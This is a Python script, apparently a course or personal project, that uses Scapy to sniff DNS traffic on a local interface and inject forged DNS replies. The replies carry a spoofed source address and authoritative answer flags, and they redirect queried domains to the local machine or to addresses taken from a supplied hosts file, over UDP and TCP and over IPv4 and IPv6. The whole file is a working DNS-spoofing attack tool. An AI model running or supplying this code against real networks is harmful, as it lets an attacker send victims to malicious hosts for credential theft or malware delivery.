from scapy.all import *
import getopt
import socket


def injectPacket(pkt):

    if DNS not in pkt:
        return  # Introduced for safety

    if UDP in pkt and pkt[UDP].sport==53:  # Ignore DNS responses
        return

    if TCP in pkt and pkt[TCP].sport==53:  # Ignore DNS responses
        return

    host_list = hosts.keys()
    hostname = pkt[DNS].qd.qname.decode("utf-8")[:-1]
    ip = default_ip
    if len(host_list) != 0:  # If the dictionary is not empty we must monitor only specific host names
            if hostname not in host_list:  # The queried domain is not in the file
                return
            else:
                ip = hosts[hostname]  # We retrieve the spoofed ip

    if UDP in pkt:

        if IP in pkt:  # DNS request with UDP and IPv4
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            inj = IP(src=dst_ip, dst=src_ip) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, ra=1, qr=1, aa=1, an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=ip))  # We create the spoofed packet
            send(inj)  # We sent the injected packet

        if IPv6 in pkt:  # DNS request with UDP and IPv6
            src_ip = pkt[IPv6].src
            dst_ip = pkt[IPv6].dst
            inj = IPv6(src=dst_ip, dst=src_ip) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, ra=1, qr=1, aa=1, an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=ip))
            send(inj)

    if TCP in pkt:
        if IP in pkt:  # DNS request with TCP and IPv4
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            inj = IP(src=dst_ip, dst=src_ip) / TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,ra=1, qr=1, aa=1, an=DNSRR(rrname=pkt[DNS].qd.qname,rdata=ip))
            send(inj)

        if IPv6 in pkt:  # DNS request with TCP and IPv6
            src_ip = pkt[IPv6].src
            dst_ip = pkt[IPv6].dst
            inj = IPv6(src=dst_ip, dst=src_ip) / TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,ra=1, qr=1, aa=1, an=DNSRR(rrname=pkt[DNS].qd.qname,rdata=ip))
            send(inj)


hosts = {}  # Dictionary to store the interesting domains if -h option is specified
default_ip = socket.gethostbyname(socket.gethostname())  # We get the IP of the local machine

interface = "en0"  # Default interface to use

opts, args = getopt.getopt(sys.argv[1:], "i:h:")  # We get the CLI arguments
for opt, arg in opts:
    if opt == "-i":
        interface = arg  # We update the interface
    if opt == '-h':
        host_file = open(arg, "r")
        host_lines = host_file.readlines()
        for line in host_lines:  # We insert each host in the dictionary
            fields = line.strip().split(",")
            hosts[fields[1]] = fields[0]
            hosts[fields[1]+".localdomain"] = fields[0]  # Inserted since for some reason nslookup firstly tries to query the domain with .localdomain appended

sniff(iface = interface, filter = "port 53", prn = injectPacket)  # We start sniffing, only on port 53 (DNS requests have destination port = 53)




